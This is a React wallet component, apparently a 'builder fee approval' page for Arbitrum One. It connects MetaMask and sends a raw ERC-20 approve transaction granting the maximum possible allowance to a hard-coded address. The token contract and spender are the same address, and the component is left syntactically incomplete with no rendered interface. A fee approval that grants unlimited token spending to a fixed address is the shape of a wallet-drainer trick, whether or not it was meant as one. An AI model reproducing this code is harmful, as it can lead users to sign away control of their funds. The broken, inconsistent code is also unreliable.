const { useState, useEffect } = React;

function BuilderFeeApproval() {
  const [walletStatus, setWalletStatus] = useState('Not Connected');
  const [walletAddress, setWalletAddress] = useState('');
  const [responseMessage, setResponseMessage] = useState('');
  const [responseType, setResponseType] = useState('');
  const [chainId, setChainId] = useState(null);
  const [isApproving, setIsApproving] = useState(false);

  useEffect(() => {
    const checkConnection = async () => {
      if (!window.ethereum) return;
      
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length) {
          setWalletAddress(accounts[0]);
          setWalletStatus('Connected');
          const chain = await window.ethereum.request({ method: 'eth_chainId' });
          setChainId(chain);
        }
      } catch (err) {
        console.error(err);
      }
    };

    checkConnection();
    
    if (window.ethereum) {
      const handleChainChanged = (chain) => {
        setChainId(chain);
        window.location.reload();
      };
      
      const handleAccountsChanged = (accounts) => {
        if (accounts.length === 0) {
          setWalletStatus('Not Connected');
          setWalletAddress('');
        } else {
          setWalletAddress(accounts[0]);
          setWalletStatus('Connected');
        }
      };

      window.ethereum.on('chainChanged', handleChainChanged);
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      
      return () => {
        if (window.ethereum.removeListener) {
          window.ethereum.removeListener('chainChanged', handleChainChanged);
          window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        }
      };
    }
  }, []);

  const handleChainSwitch = async () => {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0xa4b1' }]
      });
    } catch (error) {
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0xa4b1',
              chainName: 'Arbitrum One',
              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://arb1.arbitrum.io/rpc'],
              blockExplorerUrls: ['https://arbiscan.io']
            }]
          });
        } catch (addError) {
          setResponseMessage('Failed to add Arbitrum network');
          setResponseType('error');
        }
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      setWalletStatus('MetaMask Not Detected');
      return;
    }

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts"
      });

      if (accounts.length > 0) {
        setWalletStatus('Connected');
        setWalletAddress(accounts[0]);
        const chain = await window.ethereum.request({ method: 'eth_chainId' });
        setChainId(chain);
      }
    } catch (error) {
      setWalletStatus('Connection Failed');
    }
  };

  const approveBuilderFee = async () => {
  if (!window.ethereum || !walletAddress) return;
  
  try {
    setIsApproving(true);
    setResponseMessage('Initiating approval...');
    setResponseType('info');

    const tokenAddress = '0x13e46cCd194ca86212236543d2e7376b00bafa42'; // This should be your token contract
    const builderAddress = '0x13e46cCd194ca86212236543d2e7376b00bafa42'; // Builder to approve

    // Format the builder address to 32 bytes
    const paddedAddress = builderAddress.slice(2).padStart(64, '0');
    const paddedAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    const transactionParameters = {
      from: walletAddress,
      to: tokenAddress, // We call approve on the token contract
      data: '0x095ea7b3' + paddedAddress + paddedAmount, // approve(address,uint256)
    };

    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [transactionParameters]
    });

    setResponseMessage('Transaction submitted: ' + txHash);
    setResponseType('success');

  } catch (error) {
    setResponseMessage(error.message);
    setResponseType('error');
  } finally {
    setIsApproving(false);
  }
};

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(React.createElement(BuilderFeeApproval));
